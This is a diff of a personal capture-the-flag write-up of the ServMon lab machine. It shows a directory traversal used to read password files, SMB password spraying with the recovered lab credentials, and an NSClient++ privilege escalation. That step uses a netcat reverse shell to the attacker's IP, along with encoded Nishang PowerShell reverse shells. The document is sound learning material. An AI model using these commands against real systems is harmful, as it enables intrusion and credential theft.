@@ -4,7 +4,7 @@
 ## Reconnaissance
 ## Nmap Enumeration
 - Pass these commands:
-	```bash
+	```
 nmap -sV -sC -vv 10.10.10.184
 nmap -sU -vv --top-ports=10 10.10.10.184
 
@@ -123,7 +123,7 @@ nmap -sU -vv --top-ports=10 10.10.10.184
 - Login test: unknown username or password
 	- Burpsuite doesn't reveal much..input encoded in base64 and some xml code
 - Searchsploit:
-	```bash
+	```
 searchsploit nvms
 
 ---OUTPUT---
@@ -138,7 +138,7 @@ TVT NVMS 1000 - Directory Traversal                                  | hardware/
 ```
 	- We see a directory traversal vulnerability
 		- On Burpsuite we try to access what's written in the exploitdb text file and we get some output
-			```bash
+			```
 POST /../../../../../../../../../../../../windows/win.ini HTTP/1.1
 ---OUTPUT---
 ; for 16-bit app support
@@ -151,7 +151,7 @@ MAPI=1
 ```
 ## SMB Enumeration
 - to test:
-	```bash
+	```
 smbclient -U '' -L //10.10.10.184
 smbclient -U 'guest' -L //10.10.10.184
 smbclient -U 'anonymous' -L //10.10.10.184
@@ -160,7 +160,7 @@ smbclient -U 'anonymous' -L //10.10.10.184
 ## FTP Enumeration
 - username: anonymous
 - password: anonymous
-	```bash
+	```
 ftp 10.10.10.186
 cd Users
 dir
@@ -171,7 +171,7 @@ cd Nathan
 get Notes\ to\ do.txt
 ```
 	- Confidential.txt 
-		```bash
+		```
 Nathan,
 
 I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
@@ -181,7 +181,7 @@ Regards
 Nadine
 ```
 	- Notes to do.txt 
-		```bash
+		```
 1) Change the password for NVMS - Complete
 2) Lock down the NSClient Access - Complete
 3) Upload the passwords
@@ -190,7 +190,7 @@ Nadine
 ```
 - We try to access Desktop (not available in ftp)
 	- based on our searchsploit which revealed a directory traversal vulnerability we try to access the file on BurpSuite
-		```bash
+		```
 GET /../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
 
 ---OUTPUT---
@@ -203,7 +203,7 @@ IfH3s4b0Utg0t0H1sH0me
 Gr4etN3w5w17hMySk1Pa5$
 ```
 - We use crackmap exec to try out smb again with these credentials (as port 139 is open)
-	```bash
+	```
 vi users.txt # copy users Nadine and Nathan
 vi passwords.txt # Copy the passwords.txt file contents
 crackmapexec smb 10.10.10.184 -u users.txt -p passwords.txt
@@ -216,7 +216,7 @@ SMB      10.10.10.184     445    SERVMON    [+] ServMon\Nadine:L1k3B1gBut7s@W0rk
 SSH         10.10.10.184    22     10.10.10.184     [+] Nadine:L1k3B1gBut7s@W0rk
 ```
 	- We try smbclient with these credentials:
-		```bash
+		```
 smbclient -U Nadine -L //10.10.10.184
 > Password: L1k3B1gBut7s@W0rk
 
@@ -231,7 +231,7 @@ Password for [WORKGROUP\Nadine]:
 
 ```
 - We ssh into the machine as Nadine and get user flag
-	```bash
+	```
 ssh Nadine@10.10.10.184
 > yes >Enter Password<
 cd Desktop
@@ -240,7 +240,7 @@ type user.txt
 	- We see Microsoft Version upon login : `Microsoft Windows [Version 10.0.17763.864]`
 ## Initial Foothold Enumeration
 - We perform some commands:
-	```bash
+	```
 systeminfo
 ---OUTPUT---
 Access Denied
@@ -248,7 +248,7 @@ Access Denied
 	- But we know microsoft version (upon login) and we can google it and find the system information from that
 		- Windows 10 October 2018 Update
 - Enumerating we find
-	```bash
+	```
 cd c: > Program Files > NSClient++
 type nsclient.ini
 
@@ -266,7 +266,7 @@ allow arguments = true
 ```
 	- we get a password and see it is for something NSClient++ running on localhost
 - We execute the executable and check the web password:
-	```bash
+	```
 nscp.exe web password --display
 
 ---OUTPUT---
@@ -275,7 +275,7 @@ Shows the same password
 - When we access https://10.10.10.184:8443
 	- we reach NSClient++ login page (it's a bit slow)
 	- If we click forgot password we get:
-		```bash
+		```
 #### NSClient++ password
 
 The NSClient++ password can be found by running:
@@ -290,7 +290,7 @@ nscp web -- password --set new-password
 		- We get "you're not allowed - 403" response
 		- this is because it can only be accessed via localhost
 			- so we need to tunnel it to our localhost at a port
-				```bash
+				```
 ~C # Escape character (has to be enabled in ~/.ssh/config ["EnableEscapeCommandline=yes"])
 -L 8443:127.0.0.1:8443
 
@@ -302,12 +302,12 @@ just reconnect with ssh with the above arguments
 ## Privilege Escalation 
 **Note: messing ith the script and putting in bad values may crash the site and may require a reset**
 - We try to create a script:
-	![[Pasted image 20250404195548.png]]
+	![Pasted image 20250404195548.png](../Attachments/Pasted20image%2020250404195548.png)
 	- After writing we click add, then save changes, and reload the site
 		- alternatively we can pass sc.exe stop/start nscp in target machine
 	- Then we should find out Query under Queries tab. (rocknrj is the query name for me)
 - In target system we pull netcat
-	```bash
+	```
 ---LOCAL-SYSTEM---
 cp /usr/share/windows-resources/binaries/nc.exe .
 python3-m http.server 8001
@@ -325,28 +325,28 @@ echo C:\temp\nc.exe -e cmd 10.10.14.25 9999 > exploit.bat
 -------
 ## Failed Priv Esc
 - We tried to first test via ping,
-	```bash
+	```
 echo 'ping -n 1 10.10.10.184' | iconv -t UTF16LE | base64 -w 0
 ```
 	- We copied this output to our exploit.bat
-		```bash
+		```
 echo powershell -enc <base64_code> > exploit.bat
 ```
 		- Then we tried to run the command on website and listened for icmp request on our network interface
-			```bash
+			```
 sudo tcpdump -i tun0 icmp
 ```
 		- We got a response
 - Then we tried to input our reverse shell 
 	- https://github.com/samratashok/nishang/tree/master
 		- i git cloned it in my /usr/share
-		```bash
+		```
 cp /usr/share/nishang/Shell/Invoke-PowerShellTcpOneLine.ps1 .
 OR
 cp /usr/share/nishang/Shell/Invoke-PowerShellTcp.ps1 .
 ```
 	- Then encoded it in base64
-		```bash
+		```
 cat Invoke-PowerShellTcp.ps1 | iconv -t UTF16LE | base64 -w 0
 ```
 		- And performed the steps before
@@ -355,7 +355,7 @@ cat Invoke-PowerShellTcp.ps1 | iconv -t UTF16LE | base64 -w 0
 		- When trying to execute exploit.bat in target it responds with AV detecting it as malicious
 		- Author meant for us to priv esc via API so this route isn't meant to work
 - Initially in IPPSec he also used this along with
-	```bash
+	```
 powershell -EncodedCommand <base64_text>
 ```
 - Also find out why we use iconv -t UTF16LE
